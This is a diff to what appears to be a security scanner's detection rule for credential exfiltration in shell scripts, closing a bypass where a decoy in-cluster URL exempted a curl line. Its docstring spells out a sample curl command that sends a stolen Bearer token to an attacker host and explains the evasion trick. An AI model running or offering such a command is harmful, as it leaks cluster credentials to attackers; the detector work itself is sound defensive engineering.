@@ -11987,14 +11987,32 @@ def _sh_line_has_incluster_destination(raw: str, masked: str) -> bool:
     (resolved against the whole script's simple `VAR=...` assignments) -- mentions
     the cluster's own API server. Fails closed: an unresolvable variable, an
     opaque expression, or text that isn't even URL/variable-shaped is simply not
-    a match, so the finding stays crit."""
+    a match, so the finding stays crit.
+
+    B-912 round 2 (C-135, reviewer-found): curl sends the SAME flags -- including a
+    stolen Authorization header -- to EVERY destination argument on its command line
+    (unless `--next` separates them, which this rule does not special-case). Granting
+    the exemption because SOME ONE candidate token among several resolves in-cluster
+    said nothing about the OTHERS: a decoy in-cluster URL placed alongside a genuinely
+    attacker-controlled one (`curl -H "Authorization: Bearer $TOKEN"
+    https://kubernetes.default.svc/decoy https://attacker.example.com/steal`) is a
+    real, functioning exfil shape, not a false alarm -- curl requests both, with the
+    same header. This bug pre-dates B-912's continuation-join (it already evaded on a
+    single physical line); the join only widened how often ordinary multi-line
+    formatting reaches it. Now fails closed on token COUNT too: the exemption
+    requires EXACTLY ONE candidate destination token on the line, and that one must
+    resolve to the cluster's own API server -- two or more candidate tokens never
+    qualify, regardless of how many of them are individually in-cluster."""
     dest_text = _sh_line_destination_text(raw)
-    for tok in _sh_candidate_destination_tokens(dest_text):
-        if _INCLUSTER_API_HOST_RE.search(tok):
+    tokens = _sh_candidate_destination_tokens(dest_text)
+    if len(tokens) != 1:
+        return False
+    tok = tokens[0]
+    if _INCLUSTER_API_HOST_RE.search(tok):
+        return True
+    for name in _SH_VAR_REF_RE.findall(tok):
+        if _sh_var_mentions_incluster_host(masked, name):
             return True
-        for name in _SH_VAR_REF_RE.findall(tok):
-            if _sh_var_mentions_incluster_host(masked, name):
-                return True
     return False
 
 
